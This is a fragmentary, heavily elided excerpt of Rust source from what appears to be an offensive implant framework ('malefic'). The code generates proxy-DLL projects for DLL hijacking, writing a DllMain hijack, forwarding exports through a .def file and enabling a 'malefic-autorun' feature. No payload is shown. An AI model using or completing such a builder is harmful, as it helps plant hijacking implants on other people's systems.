...
/// * `use_prelude` - Enable malefic-autorun feature
...
fn build_lib(
    ...
    // NOTE: Forwarded exports are handled entirely by the .def file
    // Empty stubs are no longer generated as they are unnecessary and can cause
    // compilation errors when export names contain illegal characters
...
// Note: Forwarded exports are handled by proxy.def file, no Rust stubs needed
{}
"#,
        runtime_dll, function_names_array, hijacked_functions
    );

    let dll_main_hijack_content = r#"
...
pub extern "system" fn DllMain(
    ...
    if hijack_dll_main {
        lib_content = lib_content + dll_main_hijack_content
    };

    let lib_path = project_root.join("src/lib.rs");
    fs::write(lib_path, lib_content)?;
    log_success!("Generated lib.rs");
    Ok(())
}
...
/// Forwarded exports are now handled entirely by the .def file.
/// Empty stubs were causing issues:
/// 1. DEF file already defines forwarding rules (export_name=dll.export_name)
/// 2. Linker generates correct export table from .def file alone
/// 3. Some function names contain illegal characters causing Rust compilation failures
#[allow(dead_code)]
...
fn build_def(
    ...
    log_success!("Generated proxy.def");
    Ok(())
}
...
fn update_cargo_toml(
    ...
    if let Some(features) = cargo_toml["features"].as_table_mut() {
        ...
        if use_prelude {
            default_features.push("malefic-autorun");
        }
    ...
    // Ensure malefic-autorun dependency exists if needed
    if use_prelude {
        if let Some(deps) = cargo_toml["dependencies"].as_table_mut() {
            if !deps.contains_key("malefic-autorun") {
                // Add malefic-autorun as optional dependency
                deps["malefic-autorun"] = toml_edit::value(toml_edit::InlineTable::from_iter([
                    ("path", "../malefic-crates/autorun"),
                    ("optional", "true"),
                ]));
            }
        }
    ...
    log_success!("Updated Cargo.toml with features");
    Ok(())
}
